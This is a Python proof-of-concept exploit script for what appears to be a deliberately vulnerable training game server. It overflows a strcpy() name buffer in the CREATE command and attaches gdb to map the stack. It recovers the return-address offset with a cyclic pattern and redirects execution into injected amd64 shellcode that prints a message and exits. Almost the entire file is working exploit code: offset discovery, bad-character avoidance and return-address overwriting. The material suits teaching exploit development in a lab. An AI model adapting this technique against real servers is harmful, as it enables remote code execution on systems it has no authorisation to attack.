"""
This is a simple proof-of-concept script to demonstrate a ver simple buffer overflow vulnerability that impacts both the Linux and Windows version of the vulnerable game. There is just one script for the simple overflow PoC because the vulnerability exists in the same spot and is triggered by the same input entry point for both platforms.

TL;DR: cmd_create() in common/game_logic.c copies the CREATE command's
<name> argument into Character.name (33 bytes) with an unbounded
strcpy() - CREATE <long name> <class> overflows the Character struct
(a local variable in handle_client()) and smashes into the rest of
handle_client()'s own stack frame, including its saved return address.

That corruption only actually matters at handle_client()'s `ret` - which
doesn't happen until the per-connection loop exits (client disconnects
or sends QUIT). So the crash is NOT synchronous with the overflowing
request/response: the server will happily send back a (garbled) "created"
response first, and only crash a moment later once the connection closes.
This script detects that via the server's pid changing (a respawn),
not via an exception on the overflowing request itself.
"""

import os
import socket
import random
import string
import struct
import subprocess
import sys
import time

os.environ["PATH"] = "/usr/bin:/bin:" + os.environ.get("PATH", "")

try:
    from pwn import asm, cyclic, cyclic_find, context, shellcraft
except ImportError:
    print("[-] pwntools is required for this PoC (cyclic() pattern generation).")
    print("    pip install pwntools")
    sys.exit(1)

HOST = "127.0.0.1" #Change to ip
PORT = 9999
RECV_CHUNK = 4096

PROMPT = b"> "

NAME_LEN = 900


def build_create_payload(name_bytes):
    return b"CREATE " + name_bytes + b" WARRIOR"

SERVER_BIN_SUFFIX = os.path.join("linux", "textrealm_server")

PTRACE_HELP = """\
[-] gdb cannot attach to the server process: Yama ptrace_scope is
    restricted (current value: {scope}) and this script is not running
    as root. gdb here is a fresh process, not a child of the server, so
    the default "restricted ptrace" policy blocks the attach outright.

    Fix ONE of the following, then re-run this script:
      1. Run this whole script with sudo:
             sudo python3 {script}
      2. Temporarily relax ptrace_scope (reverts on reboot):
             echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope
"""


def print_banner(title):
    width = 70
    print()
    print("#" * width)
    print(f"# {title}")
    print("#" * width)
    print()


def is_game_running(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    try:
        s.connect((host, port))
        return True
    except OSError:
        return False
    finally:
        s.close()


def random_bytes(n):
    return "".join(random.choice(string.ascii_letters) for _ in range(n)).encode()


def recv_until_prompt(sock, timeout=3):
    sock.settimeout(timeout)
    data = b""
    while PROMPT not in data:
        chunk = sock.recv(RECV_CHUNK)
        if not chunk:
            raise ConnectionError("connection closed by peer")
        data += chunk
    return data


def print_crash_banner(err):
    code = getattr(err, "errno", None)
    desc = getattr(err, "strerror", None) or str(err)
    print(f"!!! CONNECTION TERMINATED WITH CLIENT ERROR CODE {code} ({desc}) "
          f"- THIS IS THE SERVER CRASHING FROM THE BUFFER OVERFLOW !!!")


def pause_for_enter(message="Press Enter to continue..."):
    try:
        input(f"\n>>> {message} ")
    except EOFError:
        pass


def check_ptrace_ok():
    if hasattr(os, "geteuid") and os.geteuid() == 0:
        return True
    scope_path = "/proc/sys/kernel/yama/ptrace_scope"
    if not os.path.exists(scope_path):
        return True
    with open(scope_path) as f:
        scope = f.read().strip()
    if scope == "0":
        return True
    print(PTRACE_HELP.format(scope=scope, script=sys.argv[0]))
    return False


def find_server_pid():
    try:
        out = subprocess.check_output(["pgrep", "-f", SERVER_BIN_SUFFIX], text=True)
    except subprocess.CalledProcessError:
        return None
    for pid_str in out.split():
        pid = int(pid_str)
        try:
            exe = os.readlink(f"/proc/{pid}/exe")
        except OSError:
            continue
        if exe.endswith(os.sep + SERVER_BIN_SUFFIX):
            return pid
    return None


def wait_for_respawn(timeout=15):
    deadline = time.time() + timeout
    while time.time() < deadline:
        if is_game_running(HOST, PORT):
            return True
        time.sleep(0.3)
    return False


def find_stack_layout(pid):
    cmd = [
        "gdb", "-q", "-p", str(pid), "--batch",
        "-ex", "set pagination off",
        "-ex", "set confirm off",
        "-ex", "break handle_client",
        "-ex", "continue",
        "-ex", 'printf "STACK_CH_ADDR=%p\\n", &ch',
        "-ex", 'printf "STACK_RBP=%p\\n", $rbp',
        "-ex", 'printf "STACK_SAVED_RBP=%p\\n", *(size_t*)$rbp',
        "-ex", 'printf "STACK_RETADDR_VALUE=%p\\n", *(size_t*)($rbp+8)',
        "-ex", "detach",
        "-ex", "quit",
    ]
    return subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)


def parse_stack_layout(gdb_output):
    keys = ("STACK_CH_ADDR", "STACK_RBP", "STACK_SAVED_RBP", "STACK_RETADDR_VALUE")
    fields = {}
    for line in gdb_output.splitlines():
        for key in keys:
            prefix = key + "="
            if line.startswith(prefix):
                fields[key] = int(line[len(prefix):], 16)
    if len(fields) != len(keys):
        return None
    return fields


def print_stack_diagram(layout):
    ch_addr = layout["STACK_CH_ADDR"]
    rbp = layout["STACK_RBP"]
    retaddr_slot = rbp + 8
    saved_rbp_slot = rbp
    retaddr_value = layout["STACK_RETADDR_VALUE"]
    saved_rbp_value = layout["STACK_SAVED_RBP"]
    gap = retaddr_slot - ch_addr

    def a(addr):
        return f"0x{addr:016x}"

    SEP = object()
    lines = [
        f"{a(retaddr_slot)} : {a(retaddr_value)}  <-- RETURN ADDRESS",
        "",
        SEP,
        f"{a(saved_rbp_slot)} : {a(saved_rbp_value)}  saved rbp",
        SEP,
        f"... {gap - 8} bytes of Character ch + other locals ...",
        "(ALL of it attacker-controlled by the overflow)",
        SEP,
        f"{a(ch_addr)} : (ch->name[0])  <-- &ch",
    ]
    width = max(len(l) for l in lines if l is not SEP) + 2
    bar = "  +" + "-" * width + "+"

    print("\n  higher addresses (towards main()'s own frame)")
    print(bar)
    for line in lines:
        print(bar if line is SEP else "  | " + line.ljust(width - 1) + "|")
    print(bar)
    print("  lower addresses\n")
    print(f"  distance from &ch to the return address slot = {gap} bytes")
    print(f"  (we'll rediscover this exact number next, blindly, using a "
          f"de Bruijn pattern instead of reading it straight off the "
          f"stack like this)")


def run_gdb_capture_rip(pid):
    cmd = [
        "gdb", "-q", "-p", str(pid), "--batch",
        "-ex", "set pagination off",
        "-ex", "set confirm off",
        "-ex", "continue",
        "-ex", 'printf "CRASH_RETADDR=%p\\n", *(unsigned long*)$rsp',
        "-ex", 'printf "CRASH_RSP=%p\\n", $rsp',
        "-ex", 'printf "CRASH_SAVED_RBP_VALUE=%p\\n", *(unsigned long*)($rsp-8)',
        "-ex", "detach",
        "-ex", "quit",
    ]
    return subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)


def parse_crash_retaddr(gdb_output):
    for line in gdb_output.splitlines():
        if line.startswith("CRASH_RETADDR="):
            return int(line.split("=", 1)[1], 16)
    return None


def parse_crash_stack_extras(gdb_output):
    fields = {}
    for line in gdb_output.splitlines():
        for key in ("CRASH_RSP", "CRASH_SAVED_RBP_VALUE"):
            prefix = key + "="
            if line.startswith(prefix):
                fields[key] = int(line[len(prefix):], 16)
    if len(fields) != 2:
        return None
    return fields


SHELLCODE_MESSAGE = b"MWAHAHAHHAA"
SHELLCODE_NEWLINE = 0x0a
SHELLCODE_BADCHARS = frozenset([0x00, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20])


def _shellcraft_write_fixed_len(message, length_value):
    safe_base = length_value + 0x61
    return shellcraft.pushstr(message) + f'''
    mov rsi, rsp
    push 1
    pop rdi
    mov dl, {hex(safe_base)}
    sub dl, 0x61
    push 1
    pop rax
    syscall
    '''


def _shellcraft_write_newline():
    safe_base = SHELLCODE_NEWLINE + 0x61
    return f'''
    push {hex(safe_base)}
    sub byte ptr [rsp], 0x61
    mov rsi, rsp
    push 1
    pop rdi
    push 1
    pop rdx
    push 1
    pop rax
    syscall
    '''


def build_shellcode():
    context.arch = "amd64"
    context.os = "linux"
    asm_src = _shellcraft_write_newline()
    asm_src += _shellcraft_write_fixed_len(SHELLCODE_MESSAGE, len(SHELLCODE_MESSAGE))
    asm_src += _shellcraft_write_newline()
    asm_src += shellcraft.exit(0)
    raw = asm(asm_src)
    bad = [(i, hex(b)) for i, b in enumerate(raw) if b in SHELLCODE_BADCHARS]
    if bad:
        raise RuntimeError(
            f"shellcode contains bad byte(s) at {bad} - sscanf(\"%s\")/strcpy() "
            f"would truncate <name> right there. Pick a different "
            f"SHELLCODE_MESSAGE (both its content AND its length matter - "
            f"length N shows up as a raw `push N` immediate)."
        )
    return raw


def find_shellcode_target_addr(pid):
    cmd = [
        "gdb", "-q", "-p", str(pid), "--batch",
        "-ex", "set pagination off",
        "-ex", "set confirm off",
        "-ex", "break handle_client",
        "-ex", "continue",
        "-ex", 'printf "SHELLCODE_ADDR=%p\\n", &ch',
        "-ex", 'printf "CLOBBER_ZONE_END=%d\\n", (size_t)&ch.inventory - (size_t)&ch',
        "-ex", "detach",
        "-ex", "quit",
    ]
    return subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)


def parse_shellcode_addr(gdb_output):
    for line in gdb_output.splitlines():
        if line.startswith("SHELLCODE_ADDR="):
            return int(line.split("=", 1)[1], 16)
    return None


def parse_clobber_zone_end(gdb_output):
    for line in gdb_output.splitlines():
        if line.startswith("CLOBBER_ZONE_END="):
            return int(line.split("=", 1)[1])
    return None


def run_test(sock, label, payload):
    print_banner(label)

    try:
        sock.sendall(payload + b"\r\n")
    except OSError as e:
        print_crash_banner(e)
        return False

    print("INPUT STRING:\n" + payload.decode(errors="replace") + "\n")

    try:
        response = recv_until_prompt(sock)
    except OSError as e:
        print_crash_banner(e)
        return False

    print("SERVER RESPONSE:\n  " + response.decode(errors="replace"))
    return True


def main():
    if not is_game_running(HOST, PORT):
        print(f"[-] Nothing is listening on {HOST}:{PORT} - is the game running?")
        return

    print(f"[+] Game is running on {HOST}:{PORT}, connecting...")
    sock = socket.create_connection((HOST, PORT))

    banner = recv_until_prompt(sock)
    print(banner.decode(errors="replace"))

    if not run_test(sock, "A VALID INPUT TEST (500 bytes)", random_bytes(500)):
        sock.close()
        return

    pid_before = find_server_pid()

    run_test(
        sock, f"CREATE COMMAND WITH A {NAME_LEN}-BYTE NAME (TRIGGERS THE OVERFLOW)",
        build_create_payload(random_bytes(NAME_LEN)),
    )
    sock.close()

    print("[*] Closed the connection - that's what triggers handle_client()'s "
          "return (and therefore the crash). Checking whether the server "
          "respawned...")
    crashed = False
    deadline = time.time() + 10
    while time.time() < deadline:
        pid_after = find_server_pid()
        if pid_after is not None and pid_after != pid_before:
            crashed = True
            break
        time.sleep(0.3)

    if not crashed:
        print("\n[?] That didn't crash the server this time - nothing further to do.")
        return

    print_banner("SERVER CRASHED")
    print(f"[+] The {NAME_LEN}-byte CREATE name crashed the server on disconnect "
          f"(pid {pid_before} -> {pid_after} - see textrealm/game_logs/"
          f"textrealm.log for the crash entry).")
    pause_for_enter("Hit Enter to find the exact offset using a cyclic pattern + gdb...")

    if not check_ptrace_ok():
        return

    print("[*] Waiting for the supervisor to respawn the server...")
    if not wait_for_respawn():
        print(f"[-] Nothing came back up on {HOST}:{PORT} - is the supervisor running?")
        return

    pid = find_server_pid()
    if pid is None:
        print(f"[-] Could not find a running '.../{SERVER_BIN_SUFFIX}' process via pgrep.")
        return
    print(f"[+] Server respawned, pid={pid}")

    print_banner("LIVE STACK LAYOUT (BEFORE WE GO LOOKING FOR THE OFFSET)")
    print("[*] Attaching gdb to snapshot the real stack for the NEXT "
          "connection, before any overflow touches it - this is only "
          "possible because we still have debug symbols for this build.")
    gdb_proc0 = find_stack_layout(pid)
    time.sleep(1.5)
    sock0 = socket.create_connection((HOST, PORT), timeout=5)
    try:
        out0, _ = gdb_proc0.communicate(timeout=20)
    except subprocess.TimeoutExpired:
        print("[-] gdb never hit the breakpoint - killing it.")
        gdb_proc0.kill()
        out0, _ = gdb_proc0.communicate()
    try:
        recv_until_prompt(sock0, timeout=5)
    except OSError:
        pass
    sock0.close()

    layout = parse_stack_layout(out0)
    if layout is None:
        print("[-] Could not capture the live stack layout from gdb - "
              "skipping the diagram.")
        print(out0)
    else:
        print_stack_diagram(layout)

    pause_for_enter("Hit Enter to rediscover that same offset blindly, "
                     "using a de Bruijn pattern...")

    context.arch = "amd64"
    pattern = cyclic(NAME_LEN, n=8)
    create_payload = build_create_payload(pattern)

    print_banner("ATTACHING GDB AND RESENDING THE SAME-SIZE NAME AS A CYCLIC PATTERN")
    print(f"[+] Built a {NAME_LEN}-byte cyclic (de Bruijn) pattern - same length as "
          f"the CREATE name that just crashed the server, so the corrupted return "
          f"address lands at the exact same spot. The offset we find below will be "
          f"relative to the START of the <name> argument itself (not the whole "
          f"CREATE command).")

    gdb_proc = run_gdb_capture_rip(pid)
    time.sleep(1.5)

    try:
        sock2 = socket.create_connection((HOST, PORT), timeout=5)
        recv_until_prompt(sock2)
        try:
            sock2.sendall(create_payload + b"\r\n")
            recv_until_prompt(sock2, timeout=5)
        except OSError:
            pass
    finally:
        try:
            sock2.close()
        except (NameError, OSError):
            pass

    try:
        out, _ = gdb_proc.communicate(timeout=20)
    except subprocess.TimeoutExpired:
        print("[-] gdb did not see the crash in time - killing it; the "
              "server may still be paused.")
        gdb_proc.kill()
        out, _ = gdb_proc.communicate()

    print_banner("GDB OUTPUT")
    print(out)

    retaddr = parse_crash_retaddr(out)
    if retaddr is None:
        print("[-] Never saw a captured return address in gdb's output - "
              "gdb may not have attached in time, or the pattern didn't "
              "crash the server the same way (see the ptrace_scope note "
              "above).")
        return

    retaddr_bytes = struct.pack("<Q", retaddr)
    offset = cyclic_find(retaddr_bytes, n=8)

    print_banner("OFFSET RECOVERY")
    print(f"[+] gdb stopped on the SIGSEGV right at handle_client()'s own "
          f"`ret` instruction - not at some jumped-to address. On x86-64, "
          f"`ret` raises a #GP fault while trying to LOAD a non-canonical "
          f"address into RIP (our plain-ASCII cyclic pattern essentially "
          f"never forms a canonical 64-bit address), so that load never "
          f"commits: $rip at the stop is still `ret`'s own address, NOT "
          f"the corrupted value. That value never went anywhere, though - "
          f"RSP never advanced past the slot it was about to pop from, so "
          f"we read it straight from *$rsp instead of $rip.")
    print(f"[+] *$rsp at the moment of the crash = {hex(retaddr)}")
    print(f"[+] As raw bytes (little-endian, 8 bytes - a full 64-bit "
          f"pointer): {retaddr_bytes.hex()} ({retaddr_bytes!r})")
    print(f"[+] That 8-byte window is unique within the cyclic pattern - "
          f"cyclic_find() looks it up and tells us exactly which byte "
          f"offset of our {NAME_LEN}-byte <name> argument it came from:")
    print(f"    cyclic_find({retaddr_bytes.hex()}) = {offset}")
    print()
    if offset is None or offset < 0:
        print("[!] cyclic_find() didn't find that value in the pattern - "
              "*$rsp may not actually be the overwritten return address "
              "this time (e.g. a crash from a bad pointer dereference "
              "elsewhere, not a corrupted return address). Re-check the "
              "gdb output above.")
        return

    print(f"[+] FINAL ANSWER: byte {offset} of the CREATE command's "
          f"<name> argument is where the saved return address starts - "
          f"the first {offset} bytes are free-form filler, and the 8 "
          f"bytes right after that are what land in the instruction "
          f"pointer on return.")

    extras = parse_crash_stack_extras(out)
    if extras is None:
        print("\n[-] Could not capture the extra crash-time registers "
              "needed for the \"after\" stack diagram - skipping it.")
    else:
        crash_rsp = extras["CRASH_RSP"]
        after_layout = {
            "STACK_CH_ADDR": crash_rsp - offset,
            "STACK_RBP": crash_rsp - 8,
            "STACK_SAVED_RBP": extras["CRASH_SAVED_RBP_VALUE"],
            "STACK_RETADDR_VALUE": retaddr,
        }
        print_banner("LIVE STACK LAYOUT (AFTER THE DE BRUIJN SEQUENCE)")
        print("[*] Same stack, same addresses as the pristine diagram "
              "earlier - but now showing what's ACTUALLY sitting there "
              "after the overflow: the saved rbp and the return address "
              "are both cyclic pattern bytes, not the real values "
              "anymore.")
        print_stack_diagram(after_layout)

    pause_for_enter("Hit Enter to actually run shellcode through this - a "
                     "'Hello World' demo...")

    print("[*] Waiting for the supervisor to respawn the server...")
    if not wait_for_respawn():
        print(f"[-] Nothing came back up on {HOST}:{PORT} - is the supervisor running?")
        return
    pid = find_server_pid()
    if pid is None:
        print(f"[-] Could not find a running '.../{SERVER_BIN_SUFFIX}' process via pgrep.")
        return
    print(f"[+] Server respawned, pid={pid}")

    shellcode = build_shellcode()

    print_banner("BUILDING A REAL SHELLCODE")
    print(f"[+] pwntools assembled {len(shellcode)} bytes of real amd64 Linux "
          f"shellcode: write(1, '\\n') + write(1, {SHELLCODE_MESSAGE!r}) + "
          f"write(1, '\\n') + exit(0) - raw syscalls, no libc. The leading/"
          f"trailing newline byte (0x0a) and the message's own length (11 "
          f"= 0x0b) are both badchars, so neither is pushed as a literal "
          f"immediate - both get computed via a safe push + subtract at "
          f"runtime instead. The Makefile's -Wl,-z,execstack is what makes "
          f"the stack executable at all here; without it this would just "
          f"be a second crash (NX).")
    print(f"    {shellcode.hex()}")

    print_banner("FINDING WHERE OUR SHELLCODE WILL LAND (LIVE, PER-CONNECTION)")
    print(f"[+] The code itself loads at a fixed address (-no-pie), but the "
          f"STACK's base address is still randomized by ASLR independently "
          f"of that - so we can't reuse a stack address from an earlier "
          f"connection/process. We attach gdb, break at the very entry of "
          f"handle_client() for the NEXT connection, and read the live "
          f"address of `ch` - that's exactly where our shellcode is going "
          f"to land, since ch->name (where cmd_create()'s strcpy() starts "
          f"writing) is Character's first field, i.e. &ch itself.")

    gdb_proc2 = find_shellcode_target_addr(pid)
    time.sleep(1.5)

    sock3 = socket.create_connection((HOST, PORT), timeout=5)
    try:
        out2, _ = gdb_proc2.communicate(timeout=20)
    except subprocess.TimeoutExpired:
        print("[-] gdb never hit the breakpoint - killing it.")
        gdb_proc2.kill()
        out2, _ = gdb_proc2.communicate()

    shellcode_addr = parse_shellcode_addr(out2)
    clobber_zone_end = parse_clobber_zone_end(out2)
    if shellcode_addr is None or clobber_zone_end is None:
        print("[-] Never captured &ch / the clobber-zone size from gdb - "
              "see its output below.")
        print(out2)
        sock3.close()
        return
    print(f"[+] &ch for THIS connection = {hex(shellcode_addr)} - that's where "
          f"our shellcode will be written, and therefore where we need the "
          f"corrupted return address to point.")

    banner = recv_until_prompt(sock3)
    print(banner.decode(errors="replace"))

    SHELLCODE_CLOBBER_ZONE_END = clobber_zone_end
    shellcode_jump_addr = shellcode_addr + SHELLCODE_CLOBBER_ZONE_END

    filler_len = offset - SHELLCODE_CLOBBER_ZONE_END - len(shellcode)
    addr_bytes = struct.pack("<Q", shellcode_jump_addr)
    name_payload = (b"A" * SHELLCODE_CLOBBER_ZONE_END + shellcode
                     + b"A" * filler_len + addr_bytes[:6])
    create_payload = build_create_payload(name_payload)

    print_banner("SENDING THE SHELLCODE PAYLOAD")
    print(f"[+] <name> = {SHELLCODE_CLOBBER_ZONE_END} throwaway bytes (this "
          f"range always gets clobbered by cmd_create()'s own "
          f"ch->class_name write, so nothing here survives regardless of "
          f"what we send) + {len(shellcode)}-byte shellcode (now safely "
          f"past that zone, at {hex(shellcode_jump_addr)}) + {filler_len} "
          f"filler bytes (up to byte {offset}) + the LOW 6 bytes of "
          f"{hex(shellcode_addr)} (not all 8, since the top 2 are already "
          f"0x0000 and strcpy()'s own NUL-termination leaves them "
          f"untouched) - same total layout as the crashing pattern, "
          f"except this address is REAL and points right back at our own "
          f"shellcode instead of being garbage.")
    print(f"[+] Watch the SERVER's OWN console/terminal (not this one) for "
          f"{SHELLCODE_MESSAGE!r} - our shellcode writes to fd 1 directly "
          f"via a raw syscall, same as the server's own process, not back "
          f"over this socket.")

    pid_before = pid
    try:
        sock3.sendall(create_payload + b"\r\n")
        recv_until_prompt(sock3, timeout=5)
    except OSError:
        pass
    sock3.close()

    print("[*] Closed the connection - that's what triggers handle_client()'s "
          "return (and therefore the jump into our shellcode). Checking "
          "whether the server respawned (our shellcode ends with exit(0))...")
    executed = False
    deadline = time.time() + 10
    while time.time() < deadline:
        pid_after = find_server_pid()
        if pid_after is not None and pid_after != pid_before:
            executed = True
            break
        time.sleep(0.3)

    print_banner("RESULT")
    if executed:
        print(f"[+] Server pid changed ({pid_before} -> {pid_after}) - our "
              f"shellcode's exit(0) ran, ending the process cleanly (no "
              f"SIGSEGV this time). That confirms real code execution, not "
              f"just a crash - go check the server's console for "
              f"{SHELLCODE_MESSAGE!r}.")
    else:
        print("[!] Server pid didn't change - the jump likely didn't land "
              "where we expected. Re-check the offset and &ch address above.")


if __name__ == "__main__":
    main()
